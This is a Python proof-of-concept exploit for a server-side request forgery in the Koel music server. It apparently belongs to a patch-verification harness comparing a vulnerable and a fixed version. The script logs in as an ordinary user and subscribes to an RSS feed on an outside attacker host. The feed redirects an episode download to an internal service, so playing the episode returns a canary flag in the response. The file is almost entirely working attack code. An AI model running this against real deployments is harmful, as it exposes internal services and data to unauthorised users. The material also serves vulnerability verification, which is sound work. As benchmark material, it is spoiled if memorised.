#!/usr/bin/env python3
"""ORIGINAL PoC -- CVE-2026-47260 (given to the method).

Full-read SSRF through Koel's podcast EPISODE PLAYBACK download path
(EpisodePlayable::createForEpisode -> Http::sink()->get()).

An authenticated non-admin user subscribes to an attacker RSS feed whose episode
<enclosure url> points at an attacker host (PHP-public 13.135.91.10) that 302-redirects
to an internal service. Playing the episode makes Koel download the redirect target
server-side and stream the bytes back -- so ${PCB_FLAG} from the internal canary
(10.135.91.192) appears in the /play response body.

  V0 (phanan/koel:9.3.2, no isSafeUrl / no redirect guard)  -> FLAG in /play body.
  V1 (phanan/koel:9.3.5, isSafeUrl + per-hop on_redirect)    -> 302 to canary throws
                                                                UnsafeUrlException -> BLOCKED.

Usage: python3 original_poc.py --port 39820   # v0 target (39821 = v1)
"""
import argparse
import json
import urllib.request

FEED = "http://13.135.91.10/feed.xml"
EMAIL, PW = "listener@pcb.test", "ListenerPass123"


def http(method, url, data=None, headers=None):
    req = urllib.request.Request(url, data=data, method=method, headers=headers or {})
    try:
        with urllib.request.urlopen(req, timeout=90) as r:
            return r.status, r.read()
    except urllib.error.HTTPError as e:
        return e.code, e.read()


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--port", type=int, default=39820)
    ap.add_argument("--flag-file", default=f"{__file__.rsplit('/',1)[0] or '.'}/.pcb_flag")
    a = ap.parse_args()
    base = f"http://localhost:{a.port}"
    flag = open(a.flag_file).read().strip()

    _, b = http("POST", f"{base}/api/me",
                data=json.dumps({"email": EMAIL, "password": PW}).encode(),
                headers={"Content-Type": "application/json", "Accept": "application/json"})
    t = json.loads(b)
    api, audio = t["token"], t["audio-token"]

    _, b = http("POST", f"{base}/api/podcasts", data=json.dumps({"url": FEED}).encode(),
                headers={"Authorization": f"Bearer {api}", "Content-Type": "application/json",
                         "Accept": "application/json"})
    try:
        pid = json.loads(b)["id"]
    except (KeyError, ValueError):
        _, b = http("GET", f"{base}/api/podcasts",
                    headers={"Authorization": f"Bearer {api}", "Accept": "application/json"})
        items = json.loads(b)
        items = items.get("data", items) if isinstance(items, dict) else items
        pid = next(p["id"] for p in items if p.get("url") == FEED)

    _, b = http("GET", f"{base}/api/podcasts/{pid}/episodes",
                headers={"Authorization": f"Bearer {api}", "Accept": "application/json"})
    episode = json.loads(b)[0]["id"]

    st, body = http("GET", f"{base}/play/{episode}?api_token={audio}")
    leaked = flag in body.decode("utf-8", "replace")
    print(f"[original] /play status={st} flag_in_body={leaked}")
    print("RESULT:", "SSRF (flag leaked in /play body)" if leaked else "blocked (no flag)")
    return 0 if leaked else 1


if __name__ == "__main__":
    raise SystemExit(main())
